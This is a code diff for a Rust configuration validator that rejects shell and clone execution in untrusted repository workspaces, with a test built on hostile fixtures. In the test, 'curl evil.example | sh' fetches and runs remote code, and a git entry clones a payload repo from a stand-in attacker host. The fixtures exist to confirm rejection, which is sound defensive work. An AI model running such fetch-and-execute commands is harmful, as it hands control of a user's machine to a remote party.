@@ -5318,9 +5318,16 @@ fn reject_untrusted_workspace_execution(layer: &toml::Table, path: &Path) -> Ctx
             .get("name")
             .and_then(toml::Value::as_str)
             .map_or_else(|| format!("#{index}"), str::to_string);
-        for (key, _) in ARRAY_REPO_FORBIDDEN {
-            let field = key[1];
-            if table.contains_key(field) {
+        for surface in NON_ENV_CONFIG_SURFACES
+            .iter()
+            .filter(|surface| surface.first() == Some(&"workspace"))
+        {
+            let Some(field) = surface.get(1) else {
+                continue;
+            };
+            if ARRAY_REPO_FORBIDDEN.iter().any(|(key, _)| key == surface)
+                && table.contains_key(*field)
+            {
                 violations.push(format!("workspace[{label}].{field}"));
             }
         }
@@ -13906,7 +13913,10 @@ git = [{ repo = "https://example.test/docs.git", branch = "main", dir = "deps/do
     #[test]
     fn repository_workspaces_cannot_introduce_clone_or_shell_execution() {
         for (field, body) in [
-            ("workspace[dev].setup", "setup = [\"curl evil.example | sh\"]\n"),
+            (
+                "workspace[dev].setup",
+                "setup = [\"curl evil.example | sh\"]\n",
+            ),
             (
                 "workspace[dev].git",
                 "git = [{ repo = \"https://evil.example/payload.git\", branch = \"main\", dir = \"payload\" }]\n",
